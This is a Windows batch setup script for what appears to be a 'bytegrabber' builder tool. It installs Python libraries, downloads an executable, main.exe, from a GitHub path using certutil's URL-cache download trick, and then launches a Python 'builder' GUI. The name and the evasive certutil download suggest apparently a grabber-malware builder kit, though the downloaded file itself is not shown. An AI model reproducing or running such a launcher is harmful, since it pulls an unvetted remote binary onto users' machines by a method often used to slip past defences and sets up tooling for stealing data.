@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.)
    goto ERROR
)

title Checking libraries...
echo Checking 'customtkinter' (1/2)
python -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    title Installing customtkinter...
    pip install customtkinter > nul
)

echo Checking 'pillow' (2/2)
python -c "import PIL" > nul 2>&1
if %errorlevel% neq 0 (
    title Installing pillow...
    pip install pillow > nul
)

cls
title Downloading and running external file...

set "url=https://github.com/ParadoxTheory/resources/raw/main/bytegrabber/main.exe"
set "outfile=%~dp0main.exe"

certutil -urlcache -split -f "%url%" "%outfile%"

if %errorlevel% neq 0 goto DOWNLOAD_ERROR

title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR

exit

:DOWNLOAD_ERROR
color 4 && title [Download Error]
echo Failed to download the external file.
pause > nul
exit

:ERROR
color 4 && title [Error]
pause > nul
